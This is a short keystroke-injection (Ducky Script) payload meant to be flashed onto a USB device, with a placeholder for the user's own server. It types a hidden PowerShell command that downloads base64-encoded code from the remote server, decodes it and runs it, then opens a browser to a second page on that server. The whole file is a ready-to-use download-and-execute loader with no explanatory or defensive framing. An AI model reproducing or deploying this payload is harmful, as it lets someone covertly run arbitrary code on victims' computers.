REM Replace HOSTPORT with your server (e.g. 192.168.1.100:8443) before flashing.
REM 1) Runs the loader (fetch /sync, decode, run).
REM 2) Opens browser to /view.
GUI r
DELAY 500
STRING powershell -nop -w hidden -c "$b=(New-Object Net.WebClient).DownloadString('https://HOSTPORT/sync');iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))"
ENTER
DELAY 1500
GUI r
DELAY 300
STRING start https://HOSTPORT/view
ENTER
